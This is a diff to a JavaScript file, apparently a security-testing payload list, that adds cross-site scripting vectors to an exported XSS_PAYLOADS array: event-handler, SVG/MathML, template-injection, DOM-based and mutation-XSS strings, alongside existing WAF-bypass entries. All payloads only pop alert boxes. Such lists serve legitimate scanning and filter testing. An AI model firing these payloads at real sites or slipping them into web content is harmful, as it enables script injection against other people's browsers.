@@ -18,6 +18,12 @@ const EVENT_HANDLERS = [
   "<details open ontoggle=alert(1)>",
   "<video src=x onerror=alert(1)>",
   "<audio src=x onerror=alert(1)>",
+  // Newer event-based vectors
+  "<dialog open onclose=alert(1)>",
+  "<search onfocus=alert(1) autofocus>",
+  "<object data=x onerror=alert(1)>",
+  "<iframe onload=alert(1) src=about:blank>",
+  "<img src=x onerror=import('data:text/javascript,alert(1)')>",
 ];
 
 // — SVG / MathML —
@@ -27,6 +33,15 @@ const SVG_MATHML = [
   "<svg><set onbegin=alert(1) attributeName=x>",
   "<math><maction actiontype=statusline xlink:href=javascript:alert(1)>click",
   '<svg><foreignObject><iframe srcdoc="<script>alert(1)</script>">',
+  // SVG event / animation vectors
+  "<svg><use href=data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+>",
+  "<svg><a xlink:href=javascript:alert(1)><text y=1>click</text></a></svg>",
+  "<svg><discard onbegin=alert(1)>",
+  "<svg><image href=x onerror=alert(1)>",
+  // MathML vectors
+  "<math><mi xlink:href=javascript:alert(1)>click</mi></math>",
+  "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
+  "<math><ms><img src=x onerror=alert(1)></ms></math>",
 ];
 
 // — Attribute escapes —
@@ -70,12 +85,18 @@ const WAF_BYPASS = [
   "<svg/onload=alert(1)>",
 ];
 
-// — Template injection —
+// — Template injection / template literals —
 const TEMPLATE_INJECTION = [
   "{{constructor.constructor('return alert(1)')()}}",
   "${alert(1)}",
   "<%= alert(1) %>",
   "{{7*7}}",
+  // Template literal exploitation
+  "`${alert(1)}`",
+  "${`alert(1)`}",
+  "{{self.__proto__.constructor('return alert(1)')()}}",
+  "<script>alert`1`</script>",
+  "<script>`${alert(1)}`</script>",
 ];
 
 // — Polyglot —
@@ -92,6 +113,10 @@ const DOM_BASED = [
   "<img src=x onerror=alert(document.domain)>",
   "#<script>alert(1)</script>",
   '<input type=text value="" onfocus=alert(1) autofocus>',
+  // Mutation XSS (mXSS) vectors
+  '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
+  "<style><style/><script>alert(1)</script>",
+  '<svg><style>{font-family:"<img/src=x onerror=alert(1)>"}',
 ];
 
 export const XSS_PAYLOADS = [
